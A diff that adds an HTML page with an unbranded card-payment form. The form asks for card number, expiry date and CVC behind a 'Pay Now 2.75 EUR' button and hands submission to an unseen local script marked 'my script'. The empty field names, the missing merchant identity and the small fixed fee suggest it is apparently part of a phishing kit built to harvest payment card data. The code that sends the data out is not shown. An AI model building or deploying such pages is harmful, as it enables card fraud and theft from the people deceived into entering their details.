@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html >
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/moilo.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+
+    <div class="top1">
+        <img src="./img/tipola.JPG" alt="">
+    </div>
+
+    <div class="kolch2">
+        
+        <img class="img2" src="./img/cc.JPG" alt="">
+
+        <form method="post" id="pg2">
+            <div class="cc">
+                <input type="tel" name="" id="numcc" placeholder="Your Card Number" maxlength="19" required>
+
+                <svg width="2em" height="1.6em" viewBox="0 0 24 24" focusable="" class="sc-2274bq-0 bEoFZP"><path fill-rule="evenodd" d="M4 4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4H4ZM16 8C16 7.44772 16.4477 7 17 7H19C19.5523 7 20 7.44772 20 8V9C20 9.55228 19.5523 10 19 10H17C16.4477 10 16 9.55228 16 9V8ZM4 15C4 14.4477 4.44772 14 5 14H8C8.55228 14 9 14.4477 9 15C9 15.5523 8.55228 16 8 16H5C4.44772 16 4 15.5523 4 15ZM11 14C10.4477 14 10 14.4477 10 15C10 15.5523 10.4477 16 11 16H16C16.5523 16 17 15.5523 17 15C17 14.4477 16.5523 14 16 14H11ZM18 15C18 14.4477 18.4477 14 19 14C19.5523 14 20 14.4477 20 15C20 15.5523 19.5523 16 19 16C18.4477 16 18 15.5523 18 15Z" fill="#73808C" clip-rule="evenodd" class="sc-2274bq-4 jFnDyb"></path></svg>
+            </div>
+            <!--  -->
+            <div class="cc2">
+                
+                    <input class="inp inp1"   type="tel" name="" id="numdd" placeholder="MM/YY" maxlength="5" required>
+                
+                
+                    <input class="inp"  type="tel" name="" id="numvv" placeholder="CVC" maxlength="4" required>
+                
+            </div>
+            <button type="submit" >
+                
+            <span>Pay Now</span><span style="padding-left: 0.5rem;">2.75 EUR</span><svg height="2em" width="2em" viewBox="0 0 24 24" focusable="false" class="sc-2274bq-0 bEoFZP"><path fill-rule="evenodd" d="M17.2966 12L11.2394 5.87299L13.091 4L20.9999 12L13.091 20L11.2394 18.127L17.2966 12Z" fill="#FFFFFF" clip-rule="evenodd" class="sc-2274bq-4 jFnDyb"></path><path fill-rule="evenodd" d="M18.7119 13.3245L3 13.3245L3 10.6757L18.7119 10.6757L18.7119 13.3245Z" fill="#FFFFFF" clip-rule="evenodd" class="sc-2274bq-4 jFnDyb"></path></svg>
+            </button>
+        </form>
+    </div>
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+       $("#numdd").on("keyup",function(){
+           dd = $(this).val().split("/").join("");
+           dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+           $(this).val(dd);
+       });
+   </script>
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
